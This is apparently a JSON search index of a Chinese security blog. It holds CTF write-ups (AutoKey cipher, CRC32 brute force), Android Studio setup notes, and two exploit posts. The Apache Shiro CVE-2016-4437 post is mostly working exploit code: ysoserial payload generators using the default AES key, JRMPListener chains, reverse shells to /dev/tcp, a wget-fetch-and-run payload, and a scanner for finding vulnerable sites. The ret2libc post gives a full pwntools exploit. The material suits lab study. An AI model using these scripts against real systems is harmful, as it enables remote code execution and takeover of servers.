{"pages":[{"title":"about","text":"Hello This is ShuYu","link":"about/index.html"},{"title":"tags","text":"","link":"tags/index.html"},{"title":"friends","text":"here you can find some friends of mine","link":"friends/index.html"}],"posts":[{"title":"2019年西湖论剑之维吉尼亚和AutoKey的区别","text":"奇怪的TTL题目描述：我们截获了一些IP数据报，发现报文头中的TTL值特别可疑，怀疑是通信方嵌入了数据到TTL，我们将这些TTL值提取了出来，你能看出什么端倪吗？ 1、数据整理附件中给了个文件,发现ttl.txt中的ttl只有4个值63,127,191,255，写出他们的二进制表示后发现只有最高两位不同，把前两位提取出来，然后十六进制转字符串，发现所有字符串都是19,af之间,然后自然考虑这是又是十六进制，然后写入文件中。发现写出来的16进制数开头是ffd8,打开是这样的 万物皆可binwalk 放在linux下binwalk分离到6张残图 foremost 或者binwalk -e 得到 扫描得到 key:AutomaticKey cipher:fftu{2028mb39927wn1f96o6e12z03j58002p} 2、然后开始入坑一开始以为是维吉尼亚加密，这里解释一下维吉尼亚加密维吉尼亚密码(Vigenère Cipher)是在单一恺撒密码的基础上扩展出多表代换密码，根据密钥(当密钥长度小于明文长度时可以循环使用)来决定用哪一行的密表来进行替换，以此来对抗字频统计 明文：THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG密钥(循环使用)：CULTURE加密过程：如果第一行为明文字母，第一列为密钥字母，那么明文字母&apos;T&apos;列和密钥字母&apos;C&apos;行的交点就是密文字母&apos;V&apos;，以此类推。密文：VBP JOZGM VCHQE JQR UNGGW QPPK NYI NUKR XFK 然后拿着本题的密钥和密文去解密，得到答案然后gg 其实是AutoKey Cipher，人家在题目里都提示了，只能怪自己太死脑筋和孤陋寡闻 3、啥·是AutoKey Cipher其实原理和维吉尼亚基本一致的，但是维吉尼亚当密钥长度小于明文，将会循环使用密钥，而Autokey Cipher当密钥长度不足时，将会开始使用明文的第一个字母开始附加在密钥上。在本题的体现是密钥12位，而密文中字母有14哥所以最后两个需要拿f l 替换AutoKey Cipher在线加解密 4、使用Python3解密AutoKey Cipher&gt;&gt;&gt; from pycipher import Autokey&gt;&gt;&gt; Autokey(&apos;AutomaticKey&apos;).decipher(&apos;fftu{2028mb39927wn1f96o6e12z03j58002p}&apos;)&apos;FLAGABDFDEABEE&apos;&gt;&gt;&gt; Autokey(&apos;AutomaticKey&apos;).encipher(&apos;FLAGABDFDEABEE&apos;)&apos;FFTUMBWNFOEZJP&apos; Vigenere&gt;&gt;&gt;from pycipher import Vigenere&gt;&gt;&gt;Vigenere(&apos;CULTURE&apos;).encipher(&apos;THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG&apos;)&apos;VBPJOZGMVCHQEJQRUNGGWQPPKNYINUKRXFK&apos;&gt;&gt;&gt;Vigenere(&apos;CULTURE&apos;).decipher(&apos;VBPJOZGMVCHQEJQRUNGGWQPPKNYINUKRXFK&apos;&apos;THEQUICKBROWNFOXJUMPSOVERTHELAZYDOG&apos;","link":"2019/04/09/2019%E5%B9%B4%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E4%B9%8B%E7%BB%B4%E5%90%89%E5%B0%BC%E4%BA%9A%E5%92%8CAutoKey%E7%9A%84%E5%8C%BA%E5%88%AB/"},{"title":"Android Studio踩过的坑","text":"最近想学一下安卓安全，但是开发是基础，重新安装了一次AS打算来学几个小项目，和曾经一样，一杯酒，一包烟，一个环境配一天，AS的环境确实坑贼多的 坑1、Unable to access Android SDK add-on list很好奇，为什么安装android studio的时候不直接帮忙装个SDK，非要先装个空壳然后单独下SDK，当然这服务于一些电脑已经装过SDK的同志，但是我觉得在安装AS的时候应该给个选项什么的吧解决办法-就是下载咯 然后选择一个位置下就行（为什么是坑呢，因为300m的东西，用我航校园网下了3个小时，后来换流量1分钟就结束了！！！阿伟死了） 坑2、第一次启动AS的时候配置一写Gradle服务第一次打开是这样滴看似一切正常，但是你等啊等等阿等，酒喝完了，烟抽完了，还在提示还在下载gradle-XXX-all.zip这一次不是网络问题了。因为流量也贼慢其实AS做的操作就是网上下个包到/.gradle/wrapper/dist/graXX/至于速度为什么这么慢，还真不知道解决办法：自行下载一个.zip然后放进来（由于上一次下载中止，这个文件夹下会有些其他的垃圾文件，你可以先删除，只留下.zip,然后重启！！一定要重启，然后AS会自动解压使用！gradle下载地址传送门 活着挺好的，为什么要学安卓开发","link":"2019/04/02/Android-Studio%E8%B8%A9%E8%BF%87%E7%9A%84%E5%9D%91/"},{"title":"64位elf的ret2libc","text":"不同点主要是32位的参数丢栈上，而64位的函数前6个参数丢寄存器上x86-64环境下非微软操作系统的前六个整型参数通过寄存器传递,按顺序为:rdi,rsi,rdx,rcx,r8,r9.同时XMM0到XMM7用来放置浮点变元,通过栈传递参数时所有的数据大小都向8的倍数对齐. 再回味一下这两个函数ps:read函数 ssize_t read(int fd, void *buf, size_t count); 函数的参数【int fd】：这个是文件指针函数的参数【void *buf】：读上来的数据保存在缓冲区buf中，同时文件的当前读写位置向后移函数的参数【size_t count】：是请求读取的字节数。若参数count 为0, 则read()不会有作用并返回0. 返回值为实际读取到的字节数, 如果返回0read()会把参数fd 所指的文件传送count个字节到buf指针所指的内存中 write函数 ssize_t write(int fd,const void *buf,size_t nbytes) 把缓冲区(buf)的前nbytes个字节写入与文件描述符(fildes)关联的文件。write返回实际写入的字节数，如果文件描述符有错误或者底层设备的驱动程序对数据长度比较敏感，表示在write调用中出现了错误，返回值可能会小于nbytes。如果函数返回0，表示未写入任何数据；返回-1表示write调用中出现了错误，错误代码保存在全局变量errno中fd为1的时候是标准输出流puts直接传地址，gets和read函数基本差不多 一道题目easyropida打开主函数 __int64 __fastcall main(__int64 a1, char **a2, char **a3){ char buf; // [rsp+0h] [rbp-10h] write(1, &quot;easy_rop&quot;, 8uLL); read(0, &amp;buf, 0x64uLL); return 0LL;} 确定思想为通过write拿到libc地址，调用system-getflag 计算偏移为0x10+0x8=0x18 一步步算下去即可 exp # -*- coding: utf-8 -*- from pwn import *from LibcSearcher import *context.terminal=[&apos;gnome-terminal&apos;,&apos;-x&apos;,&apos;sh&apos;,&apos;-c&apos;]sh=process(&quot;./pwn&quot;)#sh=remote(&apos;49.235.243.206&apos;,&apos;8004&apos;)ret2libc3=ELF(&quot;./pwn&quot;)#pwnlib.gdb.attach(sh,&apos;b *0x40070F&apos;)main_addr=0x4006CDpop_rsi_r15_addr=0x400771pop_rdi_addr=0x400773print(&quot;main地址：0x&quot;+str(main_addr))#print(ret2libc3.got)#rdi放1 rsi放got表中write地址payload=&apos;f&apos;*0x18+p64(pop_rdi_addr)+p64(1) +p64(pop_rsi_r15_addr)+p64(ret2libc3.got[&apos;write&apos;])+p64(ret2libc3.got[&apos;write&apos;])+p64(ret2libc3.plt[&apos;write&apos;])+p64(main_addr)sh.recvuntil(&apos;easy_rop&apos;) sh.sendline(payload)write_libc_addr=u64(sh.recv(8))print(&quot;write的libc地址:&quot;+str(hex(write_libc_addr)))libc=LibcSearcher(&apos;write&apos;,write_libc_addr)libcbase=write_libc_addr-libc.dump(&apos;write&apos;)print(&quot;libc基址:&quot;+str(hex(libcbase)))system_addr=libcbase+libc.dump(&apos;system&apos;)bin_sh=libcbase+libc.dump(&apos;str_bin_sh&apos;)print(&quot;system函数地址:&quot;+str(hex(system_addr)))print(&quot;bin_sh地址:&quot;+str(hex(bin_sh)))payload=&apos;f&apos;*0x18+p64(pop_rdi_addr)+p64(bin_sh)+p64(system_addr)sh.sendline(payload)sh.interactive()","link":"2019/11/19/64%E4%BD%8Delf%E7%9A%84ret2libc/"},{"title":"不使用JRMPListener实现Apache Shiro 1.2.4反序列化漏洞（CVE-2016-4437）反弹shell","text":"这个漏洞挺久远的，但是又很常见，还是有很多站点有这个问题，但是之前总是没打通，分析了一下发现是自己的姿势错了，感谢菠萝师傅远程帮我调试目录 漏洞环境搭建 工具 rce 复现 常规反弹shell 复现 终极payload 不使用JRMPListener能否反弹shell问题Q1 2020/6/8 2020/6/17 漏洞环境搭建直接使用docker搭建即可 docker pull medicean/vulapps:s_shiro_1docker run -d -p 80:8080 medicean/vulapps:s_shiro_1 工具首先你要有ysoserial的jar文件自行编译法 git　clone https://github.com/frohoff/ysoserial.gitcd ysoserialmvn package -DskipTests 在target目录下就有ysoserial-0.0.5-SNAPSHOT-all.jar /或者0.0.6我发现编译很慢，也可以直接去网上找现成的比如https://github.com/Kit4y/Src-Toolset/blob/master/anothervol-ShiroScan-master/ShiroScan/moule/ysoserial.jar然后是pycrypto模块，这里我用ubuntu,因为win10这个大小写的毛病一直在 pip3 install pycrypto rce 复现1、生成一个rce的脚本 # pip install pycryptoimport sysimport base64import uuidfrom random import Randomimport subprocessfrom Crypto.Cipher import AESdef encode_rememberme(command): popen = subprocess.Popen([&apos;java&apos;, &apos;-jar&apos;, &apos;ysoserial.jar&apos;, &apos;CommonsCollections2&apos;, command], stdout=subprocess.PIPE) BS = AES.block_size pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode() key = &quot;kPH+bIxk5D2deZiIxcaaaA==&quot; mode = AES.MODE_CBC iv = uuid.uuid4().bytes encryptor = AES.new(base64.b64decode(key), mode, iv) file_body = pad(popen.stdout.read()) base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body)) return base64_ciphertextif __name__ == &apos;__main__&apos;: payload = encode_rememberme(sys.argv[1]) with open(&quot;payload.cookie&quot;, &quot;w&quot;) as fpw: print(&quot;rememberMe={}&quot;.format(payload.decode()), file=fpw) 其中注意脚本和ysoserial.jar在同一目录下，使用python shiro.py &quot;curl 192.168.59.132:7777&quot;生成的payload.cookie即为payload，抓包改cookie这里有个坑，如果你这样打不通，那就是可能抓的包要改JSESSIONID，改成一个不同的就行，我把第一个4改成2即可，貌似看了一些文章说这个是一次性的，之前卡了很久当然你也可以直接写一个加上发包的脚本-改一下上面的就行 # -*- coding: utf-8 -*-import requestsimport osimport sysimport uuidimport base64import subprocessimport argparsefrom Crypto.Cipher import AES#get a rememberme payloaddef encode_rememberme(command): popen = subprocess.Popen([&apos;java&apos;, &apos;-jar&apos;, &apos;ysoserial-0.0.6-SNAPSHOT-all.jar&apos;, &apos;CommonsCollections2&apos;, command], stdout=subprocess.PIPE) BS = AES.block_size pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode() key = base64.b64decode(&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;) iv = uuid.uuid4().bytes encryptor = AES.new(key, AES.MODE_CBC, iv) file_body = pad(popen.stdout.read()) base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body)) return base64_ciphertextdef exp_shiro(url,cmd): payload = encode_rememberme(cmd) headers={ #&quot;Host&quot;: &quot;192.168.99.100:8081&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Connection&quot;: &quot;keep-alive&quot;, &quot;Cookie&quot;: &quot;JSESSIONID=CF5804018B87760C96E8908FA1A56149;rememberMe={0}&quot;.format(payload.decode()), &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot; } #print(&quot;JSESSIONID=CF5804018B87760C96E8908FA1A56149;rememberMe={0}&quot;.format(payload.decode())) requests.get(url,headers=headers)if __name__==&apos;__main__&apos;: #DO A try,port may be used try: exp_shiro(&quot;http://192.168.59.132:8081/&quot;,&quot;curl 192.168.59.132:7777&quot;) except Exception as e: print(e) 修改url和cmd即可这里我用的是直接nc -lvnp接收，也可用这两个比较有名的接收平台http://ceye.io/,http://dnslog.cn/,其中ceye要登录，dnslog不需要登录即可，另外这个平台没有nslookup 如果key和模块不好调，可以试试菠萝师傅推荐的这个https://github.com/sv3nbeast/ShiroScan使用方法也很简单python shiro_rce.py http://192.168.59.132:8081 &quot;curl 192.168.59.132:7777&quot; ,python2,python3好像都兼容也能自己写一个大概的python3 check.py import requestsimport sysrequests.packages.urllib3.disable_warnings()f=open(&apos;ip.txt&apos;,&apos;r&apos;)lines=f.readlines()f.close()#print(lines)header={ &apos;User-agent&apos; : &apos;Mozilla/5.0 (Windows NT 6.2; WOW64; rv:22.0) Gecko/20100101 Firefox/22.0;&apos;, &apos;Cookie&apos;:&apos;rememberMe=xxx&apos; }check=&quot;rememberMe&quot;with open(&quot;shiro.txt&quot;,&quot;w&quot;) as f: for line in lines: try: k = requests.get(line.replace(&apos;\\n&apos;,&apos;&apos;),headers=header,timeout=5) l = str(k.headers) if check in l: print(&quot;[+ &quot;+&quot;存在shiro:&quot;+line) f.write(line+&quot;\\n&quot;) else: print(&quot;[- &quot;+&quot;无shiro:&quot;+line) except Exception as e: #raise e passprint(&quot;全部check完毕，请查看当前目录下的shiro.txt&quot;) 常规反弹shell 复现首先在vps上开一个反弹shell的等待服务nc -lvnp 7777理论上如果是php我们能任意代码执行那么只要bash -i &gt;&amp; /dev/tcp/192.168.59.132/7777 0&gt;&amp;1就行，但是试了很久发现不能反弹成功-(这里是一个Q1之后解答） 之前已经整好了ysoserial.jar，也需要在vps上搭一个JRMP Listener 服务，语法是java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 3888 CommonsCollections2 &apos;rce code&apos;,但是这里的rce-code需要生成runtime-exec-payload前往这个平台http://www.jackson-t.ca/runtime-exec-payloads.htmlbash -i &gt;&amp; /dev/tcp/192.168.59.132/7777 0&gt;&amp;1加密得到bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjU5LjEzMi83Nzc3IDA+JjE=}|{base64,-d}|{bash,-i}其实规则就是bash: bash -c {echo,code_to_base64}|{base64,-d}|{bash,-i}python: python -c exec(&apos;code_to_base64&apos;.decode(&apos;base64&apos;))，居然生成好了payload然后运行即可java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.explo.JRMPListener 3888 CommonsCollections2 &apos;bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjU5LjEzMi83Nzc3IDA+JjE=}|{base64,-d}|{bash,-i}&apos; 然后现在就是要靶机的shiro打到我们的JRMP Listener 服务服务上，web_url是靶机url,target是我们JRMP服务getshell_exp.py-ubuntu下兼容py2,py3 import sysimport uuidimport base64import subprocessimport requestsfrom Crypto.Cipher import AESdef encode_rememberme(command): popen = subprocess.Popen([&apos;java&apos;, &apos;-jar&apos;, &apos;ysoserial.jar&apos;, &apos;JRMPClient&apos;, command], stdout=subprocess.PIPE) BS = AES.block_size pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode() key = base64.b64decode(&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;) iv = uuid.uuid4().bytes encryptor = AES.new(key, AES.MODE_CBC, iv) file_body = pad(popen.stdout.read()) base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body)) return base64_ciphertextdef exp_shiro(url,cmd): payload = encode_rememberme(cmd) headers={ #&quot;Host&quot;: &quot;192.168.99.100:8081&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Connection&quot;: &quot;keep-alive&quot;, &quot;Cookie&quot;: &quot;JSESSIONID=CF5804018B87760C96E8908FA1A56149;rememberMe={0}&quot;.format(payload.decode()), &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot; } #print(&quot;JSESSIONID=CF5804018B87760C96E8908FA1A56149;rememberMe={0}&quot;.format(payload.decode())) requests.get(url,headers=headers)if __name__ == &apos;__main__&apos;: web_url=&quot;http://192.168.59.132:8081&quot; target=&quot;192.168.59.132:3888&quot; exp_shiro(web_url,target) 综上运行就是 nc -lvnp 7777java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 3888 CommonsCollections2 &apos;bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjU5LjEzMi83Nzc3IDA+JjE=}|{base64,-d}|{bash,-i}&apos;python getshell_exp.py 终极payload那么其实也就可以一体化了环境ubuntu-python3用样的你需要把ysoserial.jar丢shiro_exp.py下shiro_exp.py # -*- coding: utf-8 -*-import requestsimport osimport signalimport sysimport uuidimport base64import timeimport subprocessimport argparsefrom Crypto.Cipher import AES#get a rememberme payloaddef encode_rememberme(command): popen = subprocess.Popen([&apos;java&apos;, &apos;-jar&apos;, &apos;ysoserial.jar&apos;, &apos;JRMPClient&apos;, command], stdout=subprocess.PIPE) BS = AES.block_size pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode() key = base64.b64decode(&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;) iv = uuid.uuid4().bytes encryptor = AES.new(key, AES.MODE_CBC, iv) file_body = pad(popen.stdout.read()) base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body)) return base64_ciphertext#httpsenderdef httpsender(url,headers): try: response = requests.get(url,headers=headers) if response.status_code == 200: print(&quot;Exploit target IP&quot;) else: print(&quot;Something happend, got status_code : &quot;+response.status_code) except Exception: print(&quot;requests error : may be Connect error&lt;&quot;)#exp for shiro to get a shelldef exp_shiro(url,cmd): payload = encode_rememberme(cmd) print(&quot;rememberMe={0}&quot;.format(payload.decode())) headers={ #&quot;Host&quot;: &quot;192.168.99.100:8081&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Connection&quot;: &quot;keep-alive&quot;, &quot;Cookie&quot;: &quot;JSESSIONID=CF5804018B87760C96E8908FA1A56149;rememberMe={0}&quot;.format(payload.decode()), &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot; } httpsender(url,headers)def javalisten(lhost,lport_listen): listenshell=&quot;bash -i &gt;&amp; /dev/tcp/{0}/{1} 0&gt;&amp;1&quot;.format(lhost,lport_listen) encode_ls=str(base64.b64encode(listenshell.encode(&apos;utf-8&apos;)),&apos;utf-8&apos;) print(encode_ls) execmd=&apos;java -cp ysoserial.jar ysoserial.exploit.JRMPListener 3888 CommonsCollections2 &quot;bash -c {echo,&apos;+encode_ls+&apos;}|{base64,-d}|{bash,-i}&quot;&apos; print(execmd) p=subprocess.Popen(execmd,shell=True, stdout=subprocess.PIPE,close_fds=True, preexec_fn = os.setsid) return pparser = argparse.ArgumentParser(description=&apos;shiro_exp U can getshell Only for study &apos;,epilog=&quot;python shiro_exp.py -u [url] -lh [localhost] -lp [localport]&quot;)parser.add_argument(&apos;--url&apos;, &apos;-u&apos;, help=&apos;目的站点的url&apos;,required=True)parser.add_argument(&apos;--lhost&apos;, &apos;-lh&apos;, help=&apos;本地监听主机IP地址&apos;,required=True)parser.add_argument(&apos;--lport&apos;, &apos;-lp&apos;, help=&apos;本机监听主机PORT端口&apos;,required=True)args = parser.parse_args()if __name__==&apos;__main__&apos;: try: rmiserver=&quot;{0}:3888&quot;.format(args.lhost) p=javalisten(args.lhost,args.lport) time.sleep(5) exp_shiro(args.url,rmiserver) os.killpg(p.pid,signal.SIGUSR1) except Exception as e: print(e) nc -lvnp 7777python3 shiro_exp.py -u http://192.168.59.132:8081 -lh 192.168.59.132 -lp 7777 使用子进程开启JRMPListener服务，等待时长5秒可根据网络自行修改 不使用JRMPListener能否反弹shell问题Q1还记得前面说过，既然能rce，为什么不直接使用bash -i &gt;&amp; /dev/tcp/192.168.59.132/7777 0&gt;&amp;1反弹shell?经过多次尝试发现，的确直接如此反弹shell不能成功，于是尝试分2步实现echo &apos;/bin/bash -i &gt;&amp; /dev/tcp/192.168.59.132/7777 0&gt;&amp;1&apos; &gt;&gt; a.txt &amp;&amp;bash a.txt又不能成功后来测试了很久发现使用echo &apos;123&apos; &gt;&gt; a.txt这样的rce是不能实现的 当觉得不可能不用JRMPListener反弹shell的时候，我发现wget居然可以直接使用，，那么我们只要先把&apos;/bin/bash -i &gt;&amp; /dev/tcp/192.168.59.132/7777 0&gt;&amp;1&apos;丢服务器上保存为shell.txt，然后bash就行也是分2步 exp_shiro(URL,&quot;wget http://XXXXXX:8089/shell.txt -O shell&quot;)exp_shiro(URL,&quot;bash shell&quot;) 然后发现有时候会成功有时候不成功，感觉是wget时间问题，大概就是wget还没成功，就bash了所以加一个sleep exp_shiro(URL,&quot;wget http://XXXXXXX:8089/shell.txt -O shell&quot;)time.sleep(4)exp_shiro(URL,&quot;bash shell&quot;) nice成功跑出了，本地测试一个一下又测试了几台服务器-如果服务器wget比较慢可以设置等5-10秒可以完美跑出 最后不用JRMPListener的完美版脚本长这样 # -*- coding: utf-8 -*-import requestsimport osimport sysimport timeimport uuidimport base64import subprocessimport argparsefrom Crypto.Cipher import AES#get a rememberme payloaddef encode_rememberme(command): popen = subprocess.Popen([&apos;java&apos;, &apos;-jar&apos;, &apos;ysoserial.jar&apos;, &apos;CommonsCollections2&apos;, command], stdout=subprocess.PIPE) BS = AES.block_size pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode() key = base64.b64decode(&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;) iv = uuid.uuid4().bytes encryptor = AES.new(key, AES.MODE_CBC, iv) file_body = pad(popen.stdout.read()) base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body)) return base64_ciphertextdef exp_shiro(url,cmd): payload = encode_rememberme(cmd) headers={ #&quot;Host&quot;: &quot;192.168.99.100:8081&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Connection&quot;: &quot;keep-alive&quot;, &quot;Cookie&quot;: &quot;JSESSIONID=CF5804018B87760C96E8908FA1A56149;rememberMe={0}&quot;.format(payload.decode()), &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot; } #print(&quot;JSESSIONID=CF5804018B87760C96E8908FA1A56149;rememberMe={0}&quot;.format(payload.decode())) requests.get(url,headers=headers)parser = argparse.ArgumentParser(description=&apos;shiro_exp U can getshell Only for study &apos;,epilog=&quot;python shiro_exp.py -u [url] -lh [localhost] -lp [localport]&quot;)parser.add_argument(&apos;--url&apos;, &apos;-u&apos;, help=&apos;目的站点的url&apos;,required=True)args = parser.parse_args()if __name__==&apos;__main__&apos;: URL=args.url try: exp_shiro(URL,&quot;wget http://XXXXX:8089/shell.txt -O shell&quot;) time.sleep(10) exp_shiro(URL,&quot;bash shell&quot;) except Exception as e: print(e) 使用python3 shiro.py -u http://192.168.59.132:8081 那问什么网上所有的getshell的文章，都是建立JRMPListener服务然后getshell呢？估计第一个人这样用了成功了，后面的人都没思考其他方法吧。 2020/6/8卧槽，今天和长亭同事打一个站，真的可以直接反弹shell，师傅们tql，学到了，5555555 我前面分析是什么玩意pocbash -c bash${IFS}-i${IFS}&gt;&amp;/dev/tcp/XXXXX/XX&lt;&amp;1 2020/6/17又有新发现改写ysoserial解决常规shell失效问题","link":"2020/04/24/Apache-Shiro-1-2-4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-4437%EF%BC%89%E5%A4%8D%E7%8E%B0%E9%81%87%E5%88%B0%E7%9A%84%E5%9D%91/"},{"title":"CRC推导以及一道CRC32爆破例题","text":"[TOC] 一、在计算机网络自顶向下链路层有一笔带过CRC检验，感觉这个地方很实用，也经常见所以还是认真对待了一下百度百科：循环冗余校验(Cyclic Redundancy Check, CRC)是一种根据网络数据包或电脑文件等数据产生简短固定位数校验码的一种散列函数，主要用来检测或校验数据传输或者保存后可能出现的错误。它是利用除法及余数的原理来作错误侦测的 一句话定义就是：假设数据传输过程中需要发送15位的二进制信息g=101001110100001，这串二进制码可表示为代数多项式g(x) = x^14 + x^12 + x^9 + x^8 + x^7 + x^5 + 1，其中g中第k位的值，对应g(x)中x^k的系数。将g(x)乘以x^m，既将g后加m个0，然后除以m阶多项式h(x)，得到的(m-1)阶余项r(x)对应的二进制码r就是CRC编码。正常人类一下子应该看不太懂，那多说几句话。1、一个不同寻常的除法运算g(x)和h(x)的除运算，可以通过g和h做xor（异或）运算。比如将11001与10101做xor运算： 明白了xor运算法则后，举一个例子使用CRC-8算法求101001110100001的效验码。CRC-8标准的h(x) = x^8 + x^7 + x^6 + x^4 + x^2 + 1，既h是9位的二进制串111010101。 经过迭代运算后，最终得到的r是10001100，这就是CRC效验码。得到余数R也就是FCS，将FCS加到M上，就得到了要发送的帧。M=10100111010000110001100 怎么检验？：把M循环再除111010101 最后余数一定为0，否者比特流中途出现错误 二、数学推理1.设欲传输的信息有K位,如图6.1所示2.首先将欲传输的数据序列m(x)乘以 XR , 其中R为g(x)的最高次冥。3.将得到的多项式XR m(x)除以约定的多项式g(x)4.忽略除法结果的“商”，取出其余数，并与XRm(x)相加，形成K+R位的发送序列，即：m’(x) = XRm(x) +r(x) CRC编码过程如下：设待校验的信息码有k位，即：$$m = (m^{k-1}、m^{k-2}、m^{k-3}……m^{1}、m^{0})$$, 多项式m(x)可表示为$$m(x) = m^{k-1}x^{k-1}+ m^{k-2}x^{k-2} +……m^1x^1+ m^0x^0 $$———————————————————————— 式（1） 用多项式g(x)的最高次幂R对应的XR 乘以m(x)，将得到式（2）$$X^Rm(x) = m^{k-1}x^{k+R-1}+ m^{k-2}x^{k+R-2} +……m^1x^{1+R}+ m^0x^0+R $$——————————————————– 式（2） 将$$X^Rm(x)$$ 模2除以g(x)，得到多项式商为A(x),余数为r(x)，即：$$A(x)g(x) = X^Rm(x) +r(x) $$—————————————————————————————————–式（3） 余数多项式r(x)可表示为$$r(x) = r^{R-1}x^{R-1}+ r^{R-2}x^{R-2} +……r^1x^1+ r^0x^0 $$————————————————————————————式（4） 将式（2）和式（4）代入式（3）得$$A(x)g(x) = m^{k-1}x^{k+R-1}+ m^{k-2}x^{k+R-2} +……m^1x^{R+1}+ m^0x^0+R + r^{R-1}x^{R-1}+ r^{R-2}x^{R-2} +……r^1x^1+ r^0x^0 $$ ——–式（5） 式（5）对应的码组为K+R位，即：N = (mk-1+ mk-2 +……m1+ m0 + rR-1+ rR-2 +……r1+ r0) ————————————————————式（6）从M到N就是CRC的编码过程mk-1+ mk-2 +……m1+ m0 为k位信息码；rR-1+ rR-2 +……r1+ r0为R位校验码。在信息接收端，将接受到的K+R位码除以相同的多项式g(x),根据式（3）所产生的余数为0，则接受到的数据信息正确无误，否则则认为信息在传输过程中产生的误码。 三、bugku例题： zip压缩包以及帮大家撸下来了123.zip解压下载后的文件，发现有68个压缩文件，并且每个压缩文件里都有一个4个字节大小的名为data.txt的txt文件，还有文本所对应的CRC32码，于是尝试用crc32碰撞还原出所有压缩包中的文件内容python3 脚本 #coding:utf-8import zipfileimport stringimport binasciidef CrackCrc(crc): for i in dic: for j in dic: for p in dic: for q in dic: s = i + j + p + q if crc == (binascii.crc32(s.encode()) &amp; 0xffffffff): print (s) f.write(s) returndef CrackZip(): for I in range(68): file = &apos;out&apos; + str(I) + &apos;.zip&apos; f = zipfile.ZipFile(file, &apos;r&apos;) GetCrc = f.getinfo(&apos;data.txt&apos;) crc = GetCrc.CRC #以上3行为获取压缩包CRC32值的步骤 print (hex(crc)) CrackCrc(crc)dic = string.ascii_letters + string.digits + &apos;+/=&apos;f = open(&apos;out.txt&apos;, &apos;w&apos;)CrackZip()f.close() 然后out.txt文本是这样的,根据碰撞出内容的格式（末尾两个==）推断这段数据是base64编码过的，先解码，根据解码结果中的flag.txt推断这可能是一个压缩包，同时根据fix the file and get the flag知需要修复文件将解码后的文件导入16进制编辑器（如010editor），观察数据，发现存在rar的文件尾C43D7B00400700，但缺少文件头，于是补上rar的文件头526172211A0700。 试了好久不会玩winhex 尴尬，最后发现是先填充0然后覆盖然后改后缀名拿到了这个包out.rar flag在注释里","link":"2019/03/15/CRC%E6%8E%A8%E5%AF%BC%E4%BB%A5%E5%8F%8A%E4%B8%80%E9%81%93CRC32%E7%88%86%E7%A0%B4%E4%BE%8B%E9%A2%98/"},{"title":"CSAPP又双叒叕来一遍之函数调用过程栈帧的变化","text":"函数调用在第三章第七章均有涉及，故专门总结一波函数调用栈帧的变化1、熟悉一下程序的进程空间 ，即对进程如何使用内存 